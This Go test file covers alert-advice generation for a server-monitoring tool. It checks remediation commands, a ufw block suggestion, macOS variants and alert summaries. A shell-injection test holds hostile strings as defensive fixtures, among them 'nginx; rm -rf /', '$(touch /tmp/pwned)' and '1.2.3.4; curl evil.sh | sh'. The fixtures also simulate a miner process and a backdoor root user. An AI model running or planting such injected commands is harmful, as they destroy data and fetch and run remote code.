package monitor

import (
	"strings"
	"testing"
	"time"

	"github.com/icaruszezen/ServerNeedSafe/internal/vault"
)

func TestBuildAlertAdviceCoversAllDefaultRules(t *testing.T) {
	rules := vault.DefaultMonitorAlertRules()
	if len(rules) == 0 {
		t.Fatal("expected non-empty DefaultMonitorAlertRules")
	}

	snap := &vault.ServerMonitorSnapshot{
		ServerID:         "srv-1",
		ServerName:       "prod-app-01",
		Host:             "10.0.0.10",
		Port:             22,
		Reachable:        true,
		OS:               "Ubuntu 24.04 LTS",
		Kernel:           "6.8.0-generic",
		Uptime:           "12d 3h",
		BootTime:         "2026-11-15 06:00:00",
		CPUCores:         4,
		CPUPercent:       95.2,
		CPUStealPct:      24.5,
		CPUIowaitPct:     42.0,
		Load1:            8.4,
		LoadPerCore:      2.1,
		MemPercent:       93.5,
		SwapPercent:      78.0,
		SwapTotalMB:      2048,
		SwapUsedMB:       1600,
		OOMKills:         3,
		OOMKillsDelta:    1,
		FDUsed:           90000,
		FDMax:            100000,
		FDPercent:        90.0,
		ProcsTotal:       240,
		ProcsRunning:     12,
		ProcsZombie:      8,
		ProcsBlocked:     6,
		CPUTempC:         86.5,
		DiskPercent:      94.0,
		MaxPartMount:     "/var/log",
		MaxPartPercent:   94.0,
		MaxInodeMount:    "/var/spool",
		MaxInodePercent:  93.0,
		DiskFullForecastHours: 4.5,
		DiskFullForecastMount: "/var/log",
		ReadOnlyMounts:   []string{"/data"},
		RAIDDegraded:     []string{"md0 [2/1] [U_]"},
		KernelErrorCount: 2,
		KernelErrors:     []string{"EXT4-fs error (device vda1): ext4_find_entry"},
		Disks: []vault.DiskPartitionStat{
			{MountPoint: "/var/log", Device: "/dev/vdb1", FSType: "ext4", TotalGB: 100, UsedGB: 94, AvailGB: 6, UsedPercent: 94.0, InodePercent: 40.0},
			{MountPoint: "/var/spool", Device: "/dev/vda1", FSType: "ext4", TotalGB: 50, UsedGB: 20, AvailGB: 30, UsedPercent: 40.0, InodePercent: 93.0},
		},
		Interfaces: []vault.NetInterfaceStat{
			{Name: "eth0", IPv4: "10.0.0.10", RxErrors: 120, RxDrops: 35},
		},
		TopCPUProcs: []vault.ProcessStat{
			{PID: 4321, User: "www-data", CPUPercent: 91.4, MemPercent: 12.0, Command: "python3 worker.py"},
		},
		TopMemProcs: []vault.ProcessStat{
			{PID: 5512, User: "mysql", CPUPercent: 15.0, MemPercent: 68.5, RSSMB: 5400, Command: "/usr/sbin/mysqld"},
		},
		ListeningPorts: []vault.ListeningPortStat{
			{Proto: "tcp", BindAddr: "0.0.0.0", Port: 6379, PublicExposed: true, PID: 778, Process: "redis-server"},
		},
		Services: []vault.ServiceStat{
			{Name: "nginx", State: "failed", SubState: "failed", Watched: true},
		},
		SystemdFailedCount: 1,
		SystemdFailedUnits: []string{"nginx.service"},
		Docker: vault.DockerSummary{
			Installed:      true,
			Running:        2,
			Unhealthy:      1,
			ExitedAbnormal: 1,
			Containers: []vault.ContainerStat{
				{Name: "api-gateway", Image: "app:v1", State: "running", Status: "Up 2 hours (unhealthy)", Health: "unhealthy"},
			},
		},
		Security: vault.SecurityPostureStat{
			SSHFailedRecent:    145,
			TopFailedIPs:       []string{"203.0.113.55"},
			FirewallStatus:     "inactive",
			FirewallDetail:     "ufw",
			UIDZeroUsers:       []string{"root", "sysbackdoor"},
			FileDrifts:         []string{"/etc/ssh/sshd_config (内容已变更)"},
			PersistenceDrifts:  []string{"crontab / systemd 持久化配置指纹变化"},
			SuspiciousProcs:    []vault.SuspiciousProcStat{{PID: 9912, User: "nobody", Reason: "tmp_exec", Severity: "critical", Command: "/tmp/.xmrig"}},
			SuspiciousOutbound: []vault.OutboundConnStat{{RemoteIP: "198.51.100.7", RemotePort: 3333, PID: 9912, Process: ".xmrig", Reason: "mining_pool_port"}},
			NewSSHLoginIPs:     []string{"198.51.100.99"},
			RecentSSHLogins:    []vault.SSHLoginEvent{{User: "root", FromIP: "198.51.100.99", Method: "publickey", Timestamp: "2026-11-27 09:00:00"}},
		},
		ClockOffsetSec: 85,
	}

	runbooks := []vault.AIRunbook{
		{ID: "rb-disk", Title: "清理日志与磁盘扩容手册", Category: "storage", Symptom: "磁盘空间占满", Tags: []string{"disk", "清理"}},
		{ID: "rb-ssh", Title: "SSH 暴力破解应急封禁", Category: "security", Symptom: "SSH 登录失败激增", Tags: []string{"ssh", "爆破"}},
	}

	for _, r := range rules {
		subKey := ""
		if r.Kind == "disk_high" {
			subKey = "/var/log"
		} else if r.Kind == "inode_high" {
			subKey = "/var/spool"
		} else if r.Kind == "systemd_failed" {
			subKey = "watched"
		}
		al := vault.MonitorAlert{
			ID:            "al-" + r.Kind,
			DedupKey:      "srv-1|" + r.Kind + "|" + subKey,
			ServerID:      "srv-1",
			ServerName:    "prod-app-01",
			Host:          "10.0.0.10:22",
			RuleKind:      r.Kind,
			RuleName:      r.Name,
			Severity:      vault.SeverityCritical,
			Status:        vault.AlertStatusFiring,
			Title:         "Test alert for " + r.Kind,
			Detail:        "Detail for " + r.Kind,
			MetricText:    "95%",
			ThresholdText: ">= 90%",
			Occurrences:   2,
			TriggeredAt:   time.Now().UTC().Add(-10 * time.Minute),
			LastSeenAt:    time.Now().UTC(),
		}

		adv := BuildAlertAdvice(al, snap, runbooks)
		if adv == nil {
			t.Fatalf("rule %s returned nil advice", r.Kind)
		}
		if strings.TrimSpace(adv.Summary) == "" {
			t.Errorf("rule %s missing advice summary", r.Kind)
		}
		if strings.TrimSpace(adv.RootCause) == "" {
			t.Errorf("rule %s missing root_cause", r.Kind)
		}
		if len(adv.Steps) == 0 {
			t.Errorf("rule %s missing remediation steps", r.Kind)
		}
		if len(adv.Commands) == 0 {
			t.Errorf("rule %s missing remediation commands", r.Kind)
		}
		if strings.TrimSpace(adv.AIPrompt) == "" {
			t.Errorf("rule %s missing ai_prompt", r.Kind)
		}
		if RuleCategoryForKind(r.Kind) == "other" {
			t.Errorf("rule %s mapped to unexpected 'other' category", r.Kind)
		}
		for _, cmd := range adv.Commands {
			if cmd.Risk != "readonly" && cmd.Risk != "mutating" {
				t.Errorf("rule %s command %q has invalid risk %q", r.Kind, cmd.Label, cmd.Risk)
			}
			if strings.TrimSpace(cmd.Command) == "" {
				t.Errorf("rule %s command %q has empty command string", r.Kind, cmd.Label)
			}
		}

		switch r.Kind {
		case "cpu_high":
			if !strings.Contains(adv.Summary, "4321") {
				t.Errorf("cpu_high advice should reference top PID 4321, got %q", adv.Summary)
			}
		case "disk_high":
			if !strings.Contains(adv.Summary, "/var/log") {
				t.Errorf("disk_high advice should reference mount /var/log, got %q", adv.Summary)
			}
			if len(adv.Runbooks) == 0 || adv.Runbooks[0].ID != "rb-disk" {
				t.Errorf("disk_high advice should match rb-disk runbook, got %+v", adv.Runbooks)
			}
		case "ssh_bruteforce":
			if !strings.Contains(adv.Summary, "203.0.113.55") {
				t.Errorf("ssh_bruteforce advice should reference top failed IP, got %q", adv.Summary)
			}
			foundUFW := false
			for _, c := range adv.Commands {
				if strings.Contains(c.Command, "ufw insert 1 deny from 203.0.113.55") && c.Risk == "mutating" {
					foundUFW = true
				}
			}
			if !foundUFW {
				t.Errorf("ssh_bruteforce with ufw firewall should suggest mutating ufw block command, got %+v", adv.Commands)
			}
		case "port_drift":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "accept_port_baseline" {
				t.Errorf("port_drift should expose accept_port_baseline quick action, got %+v", adv.QuickActions)
			}
		case "security_file_drift", "ssh_new_login_ip":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "accept_security_baseline" {
				t.Errorf("%s should expose accept_security_baseline quick action, got %+v", r.Kind, adv.QuickActions)
			}
		case "host_key_changed":
			if len(adv.QuickActions) == 0 || adv.QuickActions[0].Kind != "open_vault_known_hosts" {
				t.Errorf("host_key_changed should expose open_vault_known_hosts quick action, got %+v", adv.QuickActions)
			}
		}
	}
}

func TestBuildAlertAdvicePreventsShellInjection(t *testing.T) {
	maliciousSnap := &vault.ServerMonitorSnapshot{
		ServerID:  "srv-evil",
		Reachable: true,
		OS:        "Ubuntu 22.04",
		Services: []vault.ServiceStat{
			{Name: "nginx; rm -rf /", State: "failed", Watched: true},
		},
		SystemdFailedUnits: []string{"$(touch /tmp/pwned).service"},
		Docker: vault.DockerSummary{
			Installed: true,
			Unhealthy: 1,
			Containers: []vault.ContainerStat{
				{Name: "web`id`", State: "running", Health: "unhealthy", Status: "Up (unhealthy)"},
			},
		},
		Security: vault.SecurityPostureStat{
			SSHFailedRecent: 200,
			TopFailedIPs:    []string{"1.2.3.4; curl evil.sh | sh"},
			FirewallDetail:  "ufw",
			UIDZeroUsers:    []string{"root", "evil$(id)"},
		},
	}

	// 1. Malicious IP must be rejected by net.ParseIP
	sshAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", RuleKind: "ssh_bruteforce", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring,
	}, maliciousSnap, nil)
	for _, c := range sshAdv.Commands {
		if strings.Contains(c.Command, "evil.sh") || strings.Contains(c.Command, "1.2.3.4;") {
			t.Fatalf("malicious IP leaked into command: %q", c.Command)
		}
	}

	// 2. Malicious systemd unit / container name / username must be ignored by strict identifier sanitizer
	svcAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|systemd_failed|watched", RuleKind: "systemd_failed",
	}, maliciousSnap, nil)
	for _, c := range svcAdv.Commands {
		if strings.Contains(c.Command, "rm -rf") || strings.Contains(c.Command, "pwned") {
			t.Fatalf("malicious systemd unit leaked into command: %q", c.Command)
		}
	}

	docAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|docker_unhealthy|", RuleKind: "docker_unhealthy",
	}, maliciousSnap, nil)
	for _, c := range docAdv.Commands {
		if strings.Contains(c.Command, "`id`") {
			t.Fatalf("malicious container name leaked into command: %q", c.Command)
		}
	}

	uidAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", RuleKind: "uid_zero_backdoor",
	}, maliciousSnap, nil)
	for _, c := range uidAdv.Commands {
		if strings.Contains(c.Command, "evil$(id)") {
			t.Fatalf("malicious username leaked into command: %q", c.Command)
		}
	}

	// 3. Mount point with single quotes must be safely single-quoted
	diskAdv := BuildAlertAdvice(vault.MonitorAlert{
		ServerID: "srv-evil", DedupKey: "srv-evil|disk_high|/mnt/data'test;id", RuleKind: "disk_high",
	}, maliciousSnap, nil)
	if len(diskAdv.Commands) == 0 || !strings.Contains(diskAdv.Commands[0].Command, `'/mnt/data'\''test;id'`) {
		t.Fatalf("expected properly shell-quoted mount path, got: %+v", diskAdv.Commands)
	}
}

func TestBuildAlertAdviceMacOSCompatibility(t *testing.T) {
	macSnap := &vault.ServerMonitorSnapshot{
		ServerID:  "srv-mac",
		Reachable: true,
		OS:        "macOS 15.1",
		Kernel:    "Darwin 24.1.0",
		Security: vault.SecurityPostureStat{
			FirewallStatus: "inactive",
			FirewallDetail: "macos-alf",
		},
	}

	cpuAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "cpu_high"}, macSnap, nil)
	if len(cpuAdv.Commands) == 0 || !strings.Contains(cpuAdv.Commands[0].Command, "ps aux -r") {
		t.Fatalf("expected macOS ps command, got %+v", cpuAdv.Commands)
	}

	fwAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "firewall_inactive"}, macSnap, nil)
	if len(fwAdv.Commands) == 0 || !strings.Contains(fwAdv.Commands[0].Command, "socketfilterfw") {
		t.Fatalf("expected macOS socketfilterfw command, got %+v", fwAdv.Commands)
	}

	inodeAdv := BuildAlertAdvice(vault.MonitorAlert{ServerID: "srv-mac", RuleKind: "inode_high"}, macSnap, nil)
	if len(inodeAdv.Commands) == 0 || strings.Contains(inodeAdv.Commands[0].Command, "-printf") {
		t.Fatalf("expected BSD-safe inode command on macOS without GNU find -printf, got %+v", inodeAdv.Commands)
	}
}

func TestBuildAlertSummaryGlobalAndScoped(t *testing.T) {
	alerts := []vault.MonitorAlert{
		{ID: "1", ServerID: "s1", RuleKind: "cpu_high", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring},
		{ID: "2", ServerID: "s1", RuleKind: "disk_high", Severity: vault.SeverityWarning, Status: vault.AlertStatusAcknowledged},
		{ID: "3", ServerID: "s2", RuleKind: "ssh_bruteforce", Severity: vault.SeverityCritical, Status: vault.AlertStatusFiring},
		{ID: "4", ServerID: "s2", RuleKind: "mem_high", Severity: vault.SeverityWarning, Status: vault.AlertStatusResolved},
	}

	global := BuildAlertSummary(alerts, "")
	if global.TotalActive != 3 || global.Firing != 2 || global.Acknowledged != 1 || global.Resolved != 1 {
		t.Fatalf("unexpected global summary: %+v", global)
	}
	if global.CriticalActive != 2 || global.WarningActive != 1 || global.AffectedServers != 2 {
		t.Fatalf("unexpected global severity/server counts: %+v", global)
	}
	if global.ActiveByServer["s1"] != 2 || global.ActiveByServer["s2"] != 1 {
		t.Fatalf("unexpected ActiveByServer: %+v", global.ActiveByServer)
	}
	if global.ActiveByCategory["compute"] != 1 || global.ActiveByCategory["storage"] != 1 || global.ActiveByCategory["security"] != 1 {
		t.Fatalf("unexpected ActiveByCategory: %+v", global.ActiveByCategory)
	}

	scoped := BuildAlertSummary(alerts, "s2")
	if scoped.TotalActive != 1 || scoped.Firing != 1 || scoped.Resolved != 1 || scoped.AffectedServers != 1 {
		t.Fatalf("unexpected scoped summary for s2: %+v", scoped)
	}
}
